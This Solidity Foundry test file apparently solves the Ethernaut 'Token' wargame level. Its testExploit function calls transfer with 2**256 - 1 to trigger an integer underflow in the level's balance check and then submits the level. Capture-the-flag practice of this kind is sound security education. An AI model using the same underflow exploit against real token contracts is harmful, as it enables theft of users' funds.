// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IToken {
  function transfer(address _to, uint _value) external returns (bool);
}

contract TokenTest is Test {
  address internal challengeAddress;
  IToken internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xB4802b28895ec64406e45dB504149bfE79A38A57);
    challenge = IToken(challengeAddress);
  }

  function testExploit() public {
    challenge.transfer(msg.sender, 2**256 - 1);

    utils.submitLevelInstance(challengeAddress);
  }
}
